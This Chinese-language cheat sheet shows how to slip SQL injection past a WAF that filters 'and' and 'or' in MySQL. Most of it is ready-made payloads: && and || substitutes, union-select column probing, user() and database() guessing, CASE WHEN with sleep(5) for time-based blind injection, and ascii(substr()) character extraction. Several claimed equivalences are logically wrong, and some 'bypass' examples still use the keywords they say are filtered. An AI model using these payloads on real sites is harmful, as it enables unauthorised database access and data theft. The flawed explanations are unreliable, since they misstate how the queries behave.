### and or 被过滤怎么绕过

**1. 利用逻辑运算符的符号替代**

在某些情况下，WAF（Web Application Firewall）可能只过滤了关键字，而忽略了它们的符号表示

- **`&&` 替代 `and`：** 在 MySQL 中，`&&` 和 `and` 的功能相同。如果 `and` 被过滤，可以尝试使用 `&&`。
- **`||` 替代 `or`：** 同样，`||` 可以替代 `or` 来进行逻辑或操作。

**Payload 实例：**

- **原始注入：** `id=1 and 1=2`
- **绕过：** `id=1 && 1=2`

**2. 利用`!`、`<>`、`not` 等操作符**

通过巧妙地结合其他逻辑或比较操作符，我们可以构造出等价的判断逻辑

- **`and` 的替代：**
  - `if not (a=1) then ...` 等价于 `if a<>1 then ...`
  - 我们可以利用 `not` 或 `<>` 来否定条件，从而实现 `and` 的效果
  - **例如：** `username=admin' or not ('1'='1' and '1'='2')` 这句可以被改写为 `username=admin' or not (1=1)`，这在逻辑上是错误的，我们可以利用它来测试
  - **更具体的绕过：** `id=1 and 1=2` 可以被改写为 `id=1 or not 1=1`，这在布尔盲注中可以用来判断

**3. 利用`union select`进行盲注**

当布尔条件失效时，可以尝试使用 `union select` 来进行盲注

- **原理：**
  - 正常情况下，`union select` 需要前后两个查询的列数一致
  - 我们可以利用这一点，通过 `union select` 来注入一个不存在的列，从而触发数据库的报错，通过报错信息来判断
- **绕过方式：**
  - **首先，使用 `union` 探测列数。** `id=1 union select 1,2,3...`
  - **然后，利用列数来进行盲注。** `id=-1 union select 1, 2, user() like 'root%'` 如果页面正常回显，则说明 `user()` 以 `root` 开头。通过这种方式，可以逐字逐句地猜解数据

**4. 利用`if()`函数的替代品**

在布尔盲注中，`if()` 函数通常是不可或缺的。如果它和 `and` `or` 一起被过滤，那么需要寻找替代函数

- **`case when ... then ... end`：** 这是 `if()` 函数最常见的替代品，功能完全一样，且通常不会被过滤
  - **例如：** `id=1 and (case when 1=1 then sleep(5) else 0 end)`
  - **绕过：** `id=1 or (case when (database() like 'd%') then sleep(5) else 0 end)`
- **`greatest()` 和 `least()`：** 这两个函数返回一组值中的最大值和最小值。我们可以利用它们来构造条件判断
  - **例如：** `id=1 and greatest(1, (select if(1=1, 0, 1)))`
  - **绕过：** `id=1 or greatest(ascii(substr(database(),1,1)), 100)>100`

**5. 利用其他查询特性**

当所有常用方法都被过滤时，可以尝试利用一些非常规的查询特性

- **`having` 子句：** `having` 用于对 `group by` 的结果进行过滤。在一些情况下，`having` 后面可以接子查询，可以利用这一点进行注入
- **`limit offset`：** 我们可以通过 `limit` 和 `offset` 来逐行读取数据，再结合其他技术进行判断